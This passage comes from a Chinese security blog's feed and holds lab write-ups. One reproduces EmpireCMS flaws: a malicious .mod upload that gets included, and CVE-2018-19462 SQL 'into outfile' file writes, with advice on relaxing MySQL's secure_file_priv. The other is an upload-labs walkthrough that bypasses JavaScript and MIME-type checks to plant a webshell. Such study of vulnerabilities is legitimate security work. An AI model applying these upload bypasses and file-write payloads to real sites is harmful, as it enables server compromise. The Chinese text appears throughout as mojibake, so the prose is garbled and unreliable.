class="hljs-string">&#x27;size&#x27;</span>];<br>LoadInMod(<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$file</span>,<span class="hljs-variable">$file_name</span>,<span class="hljs-variable">$file_type</span>,<span class="hljs-variable">$file_size</span>,<span class="hljs-variable">$logininid</span>,<span class="hljs-variable">$loginin</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹LoadInModå‡½æ•°ï¼ˆ/e/class/moddofun.phpï¼‰ï¼š</p><details>    <summary>LoadInModå‡½æ•°</summary>    <pre><codes>    function LoadInMod($add,$file,$file_name,$file_type,$file_size,$userid,$username)&#123;    global $empire,$dbtbpre,$ecms_config;    //éªŒè¯æƒé™    CheckLevel($userid,$username,$classid,"table");    $tbname=RepPostVar(trim($add['tbname']));    if(!$file_name||!$file_size||!$tbname)    &#123;        printerror("EmptyLoadInMod","");    &#125;    //æ‰©å±•å    $filetype=GetFiletype($file_name);    if($filetype!=".mod")    &#123;        printerror("LoadInModMustmod","");    &#125;    //è¡¨åæ˜¯å¦å·²å­˜åœ¨    $num=$empire->gettotal("select count(*) as total from &#123;$dbtbpre&#125;enewstable where tbname='$tbname' limit 1");    if($num)    &#123;        printerror("HaveLoadInTb","");    &#125;    //ä¸Šä¼ æ–‡ä»¶    $path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";    #ä½¿ç”¨make_password(10)å¯¹æ—¶é—´è¿›è¡ŒåŠ å¯†æœ€ç»ˆæ‹¼æ¥æˆä¸ºæ–‡ä»¶å    $cp=@move_uploaded_file($file,$path);    if(!$cp)    &#123;        printerror("EmptyLoadInMod","");    &#125;    DoChmodFile($path);    @include($path);#è¿™é‡Œå°†$pathæŒ‡ä»£çš„æ–‡ä»¶åŒ…å«äº†ï¼Œç”±æ­¤å¯ä»¥æ„é€ phpè¿›è¡Œæ–‡ä»¶æ“ä½œè®©ä»–å¸®æˆ‘ä»¬å†™shell    UpdateTbDefMod($tid,$tbname,$mid);    //å…¬å…±å˜é‡    TogSaveTxtF(1);    GetConfig(1);//æ›´æ–°ç¼“å­˜    //ç”Ÿæˆæ¨¡å‹è¡¨å•æ–‡ä»¶    $modr=$empire->fetch1("select mtemp,qmtemp,cj from &#123;$dbtbpre&#125;enewsmod where mid='$mid'");    ChangeMForm($mid,$tid,$modr[mtemp]);//æ›´æ–°è¡¨å•    ChangeQmForm($mid,$tid,$modr[qmtemp]);//æ›´æ–°å‰å°è¡¨å•    ChangeMCj($mid,$tid,$modr[cj]);//é‡‡é›†è¡¨å•    //åˆ é™¤æ–‡ä»¶    DelFiletext($path);    //æ“ä½œæ—¥å¿—    insert_dolog("tid=$tid&tb=$tbname<br>mid=$mid");    printerror("LoadInModSuccess","db/ListTable.php".hReturnEcmsHashStrHref2(1));    &#125;    </codes></pre></details><p>å…³é”®ä»£ç åˆ†æå¦‚ä¸‹ï¼ˆå› ä¸ºä»£ç å¤ªé•¿äº†==å°±æˆªå›¾å‡ºæ¥ï¼‰</p><p><img src="https://i.loli.net/2021/02/14/Hu1JlL5yQcOomKk.png"></p><p>å¦‚ä¸‹</p><p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p><code>&lt;?php file_put_contents(â€œinfo.phpâ€,â€&lt;?php phpinfo(); ?&gt;â€); ?&gt;</code></p><p>ä¸Šä¼ çš„æ–‡ä»¶è¢«åŒ…å«ï¼ˆè¢«phpè§£æï¼‰å°±ä¼šæ‰§è¡Œä»¥ä¸Šä»£ç ï¼Œä»è€Œåœ¨åŒç›®å½•ä¸‹åˆ›å»º <code>info.php</code> (<code>&lt;?php phpinfo(); ?&gt;â€); ?&gt;</code>)</p><p>é‚£ä¹ˆæ¥å¤ç°ä¸€ä¸‹ï¼š</p><p>æŒ‰ç…§å¦‚ä¸‹æ“ä½œè¿›å…¥ä¸Šä¼ é¡µé¢</p><p><img src="https://i.loli.net/2021/02/14/Igh9rTBwJ16nzDu.png"></p><p><img src="https://i.loli.net/2021/02/14/SI7Vw1JAtyqQhKu.png" alt="ä¸Šä¼ é¡µé¢"></p><p>æ„é€ ä¸€ä¸ªå†…å®¹ä¸º</p><p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></p><p>æˆ–<code>&lt;?php file_put_contents(â€œinfo.phpâ€,â€&lt;?php phpinfo(); ?&gt;â€); ?&gt;</code></p><p>çš„.modåç¼€çš„æ–‡ä»¶</p><p><img src="https://i.loli.net/2021/02/14/x17kit5zP9vr8sJ.png" alt="åˆ›å»ºæ–‡ä»¶~"></p><p><img src="https://i.loli.net/2021/02/14/bSVqfcGsriWaKpD.png" alt="å¯¼å…¥~"></p><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶æˆåŠŸå†™å…¥äº†<br><img src="https://i.loli.net/2021/02/14/bWnH2d4LjRxMgaw.png" alt="æˆåŠŸå†™å…¥"></p><p>è®¿é—®å³å¯<br><img src="https://i.loli.net/2021/02/14/o7HhIAsL9CYd6rZ.png"></p><h4 id="7-5-ä»£ç æ³¨å…¥-CVE-2018-19462"><a href="#7-5-ä»£ç æ³¨å…¥-CVE-2018-19462" class="headerlink" title="7.5 ä»£ç æ³¨å…¥(CVE-2018-19462)"></a>7.5 ä»£ç æ³¨å…¥(CVE-2018-19462)</h4><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šå¸å›½CMS(EmpireCMS) &lt;= 7.5</p><p>æè¿°ï¼šEmpireCMS7.5åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„admindbDoSql.phpæ–‡ä»¶å­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´æºäºå¤–éƒ¨è¾“å…¥æ•°æ®æ„é€ ä»£ç æ®µçš„è¿‡ç¨‹ä¸­,ç½‘è·¯ç³»ç»Ÿæˆ–äº§å“æœªæ­£ç¡®è¿‡æ»¤å…¶ä¸­çš„ç‰¹æ®Šå…ƒç´ ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ç”Ÿæˆéæ³•çš„ä»£ç æ®µ,ä¿®æ”¹ç½‘ç»œç³»ç»Ÿæˆ–ç»„ä»¶çš„é¢„æœŸçš„æ‰§è¡Œæ§åˆ¶æµã€‚</p></blockquote><p>æ¼æ´å‡ºç°é¡µé¢ï¼š</p><p>è¿™é‡Œå…¶å®æ˜¯ä½¿ç”¨äº†æ–‡ä»¶å¼•ç”¨ï¼Œå¼•ç”¨äº†æ–‡ä»¶upload/e/admin/db/DoSql.php</p><p><img src="https://i.loli.net/2021/02/14/DEnAXeTWalSvZR3.png"></p><p>æŸ¥çœ‹DoSql.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ExecSql</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$userid</span>,<span class="hljs-variable">$username</span></span>)</span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$empire</span>,<span class="hljs-variable">$dbtbpre</span>;<br><span class="hljs-variable">$id</span>=(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$id</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$id</span>))<br>&#123;<br>printerror(<span class="hljs-string">&#x27;EmptyExecSqlid&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$r</span>=<span class="hljs-variable">$empire</span>-&gt;fetch1(<span class="hljs-string">&quot;select sqltext from <span class="hljs-subst">&#123;$dbtbpre&#125;</span>enewssql where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;sqltext&#x27;</span>])<br>&#123;<br>printerror(<span class="hljs-string">&#x27;EmptyExecSqlid&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br><span class="hljs-variable">$query</span>=RepSqlTbpre(<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;sqltext&#x27;</span>]);<span class="hljs-comment">#sqltextæ˜¯ä¸Šå›¾è¡¨æ ¼ä¸Šä¼ çš„å†…å®¹ï¼Œç»RepSqlTbpreå¤„ç†</span><br>DoRunQuery(<span class="hljs-variable">$query</span>);<span class="hljs-comment">#å¯¹$queryå¤„ç†</span><br><span class="hljs-comment">//æ“ä½œæ—¥å¿—</span><br>insert_dolog(<span class="hljs-string">&quot;query=&quot;</span>.<span class="hljs-variable">$query</span>);<br>printerror(<span class="hljs-string">&quot;DoExecSqlSuccess&quot;</span>,<span class="hljs-string">&quot;ListSql.php&quot;</span>.hReturnEcmsHashStrHref2(<span class="hljs-number">1</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$query=RepSqlTbpre($r[&#39;sqltext&#39;]);</code>ï¼š<br>sqltextå°±æ˜¯ç½‘é¡µä¸­è¡¨æ ¼ä¸Šä¼ çš„å†…å®¹ï¼Œåœ¨å‡½æ•°ExecSql()ä¸­ç”±RepSqlTbpre()å¤„ç†</p><p>å†æ¥çœ‹ä¸€ä¸‹RepSqlTbpre():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RepSqlTbpre</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<span class="hljs-comment">#åˆ©ç”¨str_replace()å°†è¡¨çš„å‰ç¼€è¿›è¡Œæ›¿æ¢</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$dbtbpre</span>;<br><span class="hljs-variable">$sql</span>=str_replace(<span class="hljs-string">&#x27;[!db.pre!]&#x27;</span>,<span class="hljs-variable">$dbtbpre</span>,<span class="hljs-variable">$sql</span><span class="hljs-comment">#å°†è¡¨çš„å‰ç¼€è¿›è¡Œæ›¿æ¢</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DoRunQuery($query);</code>ï¼šå¯¹$queryå¤„ç†ï¼ˆå»é™¤ç©ºæ ¼ï¼‰,ç”¨<code>;</code>åˆ†å‰²ç„¶åéå†ï¼Œæ— å…¶ä»–é™åˆ¶orè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DoRunQuery</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$empire</span>;<br><span class="hljs-variable">$sql</span>=str_replace(<span class="hljs-string">&quot;\r&quot;</span>,<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-variable">$sql</span>);<span class="hljs-comment">#å°†$sqlä¸­çš„&quot;\r&quot;ä»¥&quot;\n&quot;æ›¿æ¢</span><br><span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">foreach</span>(explode(<span class="hljs-string">&quot;;\n&quot;</span>,trim(<span class="hljs-variable">$sql</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$query</span>)&#123;<span class="hljs-comment">#ä»¥;åˆ†å‰²å†éå†</span><br>    <span class="hljs-comment">#explodeä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ‡å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›æ•°ç»„ã€‚è¿™é‡Œä½¿ç”¨&quot;;\n&quot; åˆ‡å‰² trim($sql)</span><br><span class="hljs-variable">$queries</span>=explode(<span class="hljs-string">&quot;\n&quot;</span>,trim(<span class="hljs-variable">$query</span>));<span class="hljs-comment">#trim()å»é™¤å­—ç¬¦ä¸²é¦–å°¾ç©ºç™½</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$queries</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$query</span>)<br>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-variable">$num</span>].=<span class="hljs-variable">$query</span>[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;#&#x27;</span>||<span class="hljs-variable">$query</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$query</span>[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;--&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-variable">$query</span>;<br>&#125;<br><span class="hljs-variable">$num</span>++;<br>&#125;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ret</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$query</span>)<br>&#123;<br><span class="hljs-variable">$query</span>=trim(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$query</span>)<br>&#123;<br><span class="hljs-variable">$empire</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±æ­¤å¯æ‰§è¡Œæ¶æ„çš„sqlè¯­å¥</p><p>æ„é€ payloadï¼š(outfileã€dumpfile)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="hljs-keyword">into</span> outfile &quot;D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php&quot;<br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="hljs-keyword">into</span> dumpfile &quot;D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php&quot;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/r3WmvflGnU9kVD7.png" alt="å°†è¯­å¥è¾“å…¥å…¶ä¸­"></p><p>æ‰§è¡ŒæˆåŠŸï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥myinfo.php<br><img src="https://i.loli.net/2021/02/14/afoZG4bF6jCXKx8.png" alt="æ‰§è¡ŒæˆåŠŸï¼ŒæˆåŠŸå†™å…¥myinfo.php"></p><p>è®¿é—®å³å¯è§¦å‘ï¼š<br><img src="https://i.loli.net/2021/02/14/DBmZWKXjVf6YiGx.png"></p><p>å¦‚æœä¸è¡Œçš„è¯å¯èƒ½æ˜¯mysqlå®‰å…¨é™åˆ¶çš„åŸå› </p><blockquote><p><code>secure_file_priv</code>å‚æ•°ï¼šæŸ¥çœ‹å…·æœ‰å†™æƒé™çš„ç›®å½•</p><ul><li>å½“secure_file_privçš„å€¼ä¸º<code>null </code>ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</li><li>å½“secure_file_privçš„å€¼<code>æ²¡æœ‰å…·ä½“å€¼</code>æ—¶ï¼ˆ=â€â€ï¼‰ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</li><li>å½“secure_file_privçš„å€¼ä¸º<code>/tmp/ </code>ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</li></ul></blockquote><p>ä¿®æ”¹<code>secure_file_priv</code>å‚æ•°ä¸ºç©ºï¼Œå¦‚ä¸‹ï¼›ä¿å­˜é‡å¯mysqlå³å¯<br><img src="https://i.loli.net/2021/02/14/UPoT3sOjrF6i5MK.png"></p>]]></content>
    
    
    <categories>
      
      <category>é¶åœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labsé¶åœºå°è®°</title>
    <link href="/2021/02/12/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%B0/"/>
    <url>/2021/02/12/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿‘å¹´äº†åˆå¿™åˆçˆ±ç©å“ˆå“ˆï¼Œä¹‹å‰çš„è®¡åˆ’å­¦ä¹ æç½®äº†å¥½å¤š</p><p>è¿™é‡Œæ˜¯upload-labsçš„è®°å½•ï¼Œä¸Šå­¦æœŸåšè¿‡äº†ä½†å†™çš„ä¸æ˜¯å¾ˆè¯¦ç»†ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿä¸æ˜¯éå¸¸æ¸…æ™°ï¼Œè¿™æ¬¡é‡æ–°åšä¸€éè¯¦ç»†è®°å½•ä¸€ä¸‹</p><p>å®˜æ–¹çš„tips:<br><img src="https://i.loli.net/2021/02/13/NYtQUAPus7TxGbR.png" alt="å®˜æ–¹çš„tips"><img src="https://i.loli.net/2021/02/13/JuaItBbjfo9zws8.png" alt="æ€è·¯"></p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="pass1ï¼ˆå®¢æˆ·ç«¯-jsæ£€æŸ¥ï¼‰"><a href="#pass1ï¼ˆå®¢æˆ·ç«¯-jsæ£€æŸ¥ï¼‰" class="headerlink" title="pass1ï¼ˆå®¢æˆ·ç«¯-jsæ£€æŸ¥ï¼‰"></a>pass1ï¼ˆå®¢æˆ·ç«¯-jsæ£€æŸ¥ï¼‰</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸‹~çœ‹åˆ°å¼¹çª—ï¼Œf12ä¸€ä¸‹èƒ½çœ‹åˆ°æäº¤æ—¶çš„jséªŒè¯ï¼Œè¦æ±‚ä¸Šä¼ jpgã€pngã€gifç±»å‹çš„æ–‡ä»¶ï¼ˆç®—æ˜¯å‰ç«¯çš„ç™½åå•å§ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/2D5qPnpJdzSa4jf.png"></p><p>å®¢æˆ·ç«¯æ£€æŸ¥ï¼šä¸Šä¼ éæ³•æ–‡ä»¶ï¼Œè¿”å›é€Ÿåº¦è¾ƒå¿«~</p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="1ã€ç¦ç”¨js"><a href="#1ã€ç¦ç”¨js" class="headerlink" title="1ã€ç¦ç”¨js"></a>1ã€ç¦ç”¨js</h4><h5 id="aã€burpsuiteæŠ“åŒ…åˆ é™¤æ‰€æœ‰jså†å‘åŒ…"><a href="#aã€burpsuiteæŠ“åŒ…åˆ é™¤æ‰€æœ‰jså†å‘åŒ…" class="headerlink" title="aã€burpsuiteæŠ“åŒ…åˆ é™¤æ‰€æœ‰jså†å‘åŒ…~"></a>aã€burpsuiteæŠ“åŒ…åˆ é™¤æ‰€æœ‰jså†å‘åŒ…~</h5><p><img src="https://i.loli.net/2021/02/13/FVlo1XSy2cizU9r.png"></p><p><img src="https://i.loli.net/2021/02/13/qRKdL5maXcxeP3H.png" alt="åˆ é™¤å‰"></p><p><img src="https://i.loli.net/2021/02/13/fFNXHBO92mGStZk.png" alt="åˆ é™¤å"></p><p>å¯ä»¥çœ‹åˆ°åˆ é™¤åæ‰€æœ‰jséƒ½è¢«åˆ æ‰äº†ï¼Œè¿™æ—¶å€™ä¸Šä¼ å’±ä»¬çš„ğŸå°±å¯ä»¥äº†</p><h5 id="bã€æµè§ˆå™¨ç¦ç”¨js"><a href="#bã€æµè§ˆå™¨ç¦ç”¨js" class="headerlink" title="bã€æµè§ˆå™¨ç¦ç”¨js"></a>bã€æµè§ˆå™¨ç¦ç”¨js</h5><p>å¦‚å›¾æ˜¯chormeç¦ç”¨jsçš„é¡µé¢ï¼Œedgeå’Œchormeç±»ä¼¼ï¼ˆæ¯•ç«Ÿç”¨çš„chormeå†…æ ¸ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/et3XBcxvV6UuaJw.png" alt="chormeè®¾ç½®-æœç´¢-javascript"></p><h4 id="2ã€å°†ğŸåç¼€åæ”¹ä¸ºå…è®¸çš„æ ¼å¼ï¼ŒæŠ“åŒ…æ”¹å›æ¥å³å¯"><a href="#2ã€å°†ğŸåç¼€åæ”¹ä¸ºå…è®¸çš„æ ¼å¼ï¼ŒæŠ“åŒ…æ”¹å›æ¥å³å¯" class="headerlink" title="2ã€å°†ğŸåç¼€åæ”¹ä¸ºå…è®¸çš„æ ¼å¼ï¼ŒæŠ“åŒ…æ”¹å›æ¥å³å¯"></a>2ã€å°†ğŸåç¼€åæ”¹ä¸ºå…è®¸çš„æ ¼å¼ï¼ŒæŠ“åŒ…æ”¹å›æ¥å³å¯</h4><p><img src="https://i.loli.net/2021/02/13/b8IM9rWXjLPNxQt.png" alt="2021021100205737.png"></p><p>æœ€åå³é”®æ‰“å¼€å°±èƒ½å¾—åˆ°ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„äº†ï¼Œèšå‰‘è¿æ¥å³å¯</p><p>ï¼ˆæ‰¾è·¯å¾„å¾ˆæœ‰è®²ç©¶==â€”â€”è‡ªæŸæ¬¡æ‰¾é”™è·¯å¾„ç»•äº†ä¸‰å¤©çš„ç»å†ã€ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/PpDkXby6grBmaed.png"></p><h2 id="pass2ï¼ˆMIME-TypeéªŒè¯ï¼‰"><a href="#pass2ï¼ˆMIME-TypeéªŒè¯ï¼‰" class="headerlink" title="pass2ï¼ˆMIME-TypeéªŒè¯ï¼‰"></a>pass2ï¼ˆMIME-TypeéªŒè¯ï¼‰</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è€æ ·â˜ï¼Œå…ˆä¸Šä¼ ğŸï¼Œç„¶è€Œè¢«æ— æƒ…çš„é©³å›</p><p><img src="https://i.loli.net/2021/02/13/CO4QZnmFEVw8Grz.png"></p><p>æ ¹æ®æ€è·¯ï¼Œçœ‹ä¸€ä¸‹æ˜¯æ£€æŸ¥åç¼€åï¼Œè¿˜æ˜¯æ£€æŸ¥å†…å®¹ï¼ˆæˆ–è€…éƒ½æ£€æŸ¥â€“ï¼‰</p><p>è¿™é‡Œå‡†å¤‡äº†æ‹¥æœ‰ç›¸åŒå†…å®¹<code>&lt;?php phpinfo(); ?&gt;</code>,ä½†ç±»å‹ä¸åŒçš„ğŸï¼ˆæ–‡ä»¶åç¼€ä¸åŒï¼‰</p><p><strong>ä¹Ÿå°±æ˜¯åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡ç±»å‹ï¼Œéå›¾ç‰‡å†…å®¹çš„æ–‡ä»¶</strong></p><p><img src="https://i.loli.net/2021/02/13/1ODwIoL2xR3WFfv.png"></p><p>åˆšæ‰phpç±»å‹ä¸Šä¼ å¤±è´¥äº†ï¼Œç°åœ¨å’±ä»¬ä¸Šä¼ jpgç±»å‹çš„è¯•è¯•</p><p><img src="https://i.loli.net/2021/02/13/UY6eEcIPXFDVzOL.png"></p><p>æ˜¾ç„¶æ˜¯å¯ä»¥çš„</p><p>ä½†æ˜¯æ‰“å¼€å´ä¸æ˜¾ç¤ºphpinfoï¼Œ</p><p>æ˜¯å› ä¸ºphpä¸ä¼šå¯¹å›¾ç‰‡è¿›è¡Œè§£æï¼Œåé¢çš„å›¾ç‰‡é©¬ä¹Ÿæ˜¯ä¸€æ ·ï¼Œéœ€è¦æ­é…æ–‡ä»¶åŒ…å«æ¼æ´ä½¿ç”¨</p><p>ï¼ˆæˆ–è€…ä¿®æ”¹é…ç½®ä½¿å¾—å›¾ç‰‡ä¹Ÿèƒ½è§£æï¼‰è¯¦æƒ…çœ‹åæ–‡</p><p><img src="https://i.loli.net/2021/02/13/WbiL8XVsZH49rDG.png"></p><p>ç„¶åæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼ŒäºŒè€…çš„å·®åˆ«åœ¨äºåç¼€åï¼Œè¿˜æœ‰Content-Type</p><p><img src="https://i.loli.net/2021/02/13/cKYluSLhsoFX9RH.png" alt="20210211003858612.png"></p><p>å°†info.phpæ”¹ä¸ºinfo.jpgï¼ŒæŠ¥é”™</p><p>å†å°è¯•å°†content-typeæ”¹ä¸ºå›¾ç‰‡å½¢å¼ï¼š<code>image/jpeg</code>æˆåŠŸï¼</p><h3 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h3><p>å°†ä¼ å…¥çš„ğŸæŠ“åŒ…ä¿®æ”¹content-typeä¸º<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ï¼Œæ”¾åŒ…å³å¯</p><p>æºç ï¼ˆé™„è§£æï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<span class="hljs-comment">#file_exists â€” æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<span class="hljs-comment">#æ£€æŸ¥æ–‡ä»¶MIMEç±»å‹æ˜¯å¦ä¸ºè¿™ä¸‰ç§ï¼Œæ˜¯åˆ™ä¸ºæ–‡ä»¶åå’Œä¸Šä¼ è·¯å¾„èµ‹å€¼ï¼Œä»è€Œä½¿å¾—move_uploaded_file()ä¸ºçœŸï¼Œä¸Šä¼ æˆåŠŸ</span><br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <span class="hljs-comment">#move_uploaded_file() - å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®</span><br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span 